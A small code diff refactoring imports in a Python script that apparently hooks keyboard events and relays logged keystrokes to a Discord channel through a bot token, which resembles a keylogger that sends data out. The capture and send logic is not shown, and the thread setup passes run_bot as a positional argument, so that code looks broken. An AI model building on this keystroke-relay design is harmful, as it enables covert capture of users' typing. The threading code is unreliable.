@@ -7,8 +7,7 @@ import os
 import keyboard as k
 import datetime
 import serial
-import send_discord
-from send_discord import ENABLE_DISCORD_LOGGING , YOUR_CHANNEL_ID, YOUR_TOKEN , buffer_path
+from send_discord import ENABLE_DISCORD_LOGGING , YOUR_CHANNEL_ID, YOUR_TOKEN , buffer_path , run_bot
 SCRIPT_PATH = os.path.dirname(os.path.abspath(__file__))
 NULL_CHAR = chr(0)
 
@@ -20,7 +19,7 @@ shift_pressed = False
 
 discord_thread = None
 if ENABLE_DISCORD_LOGGING:
-    discord_thread = threading.Thread(send_discord.run_bot)
+    discord_thread = threading.Thread(run_bot)
     discord_thread.daemon = True
     discord_thread.start()
 def on_key_event(e):
@@ -68,7 +67,7 @@ def log(message:str):
             discord_log.write(message)
 def restart_discord_thread():
     global discord_thread
-    discord_thread = threading.Thread(send_discord.run_bot)
+    discord_thread = threading.Thread(run_bot)
     discord_thread.daemon = True
     discord_thread.start()
 
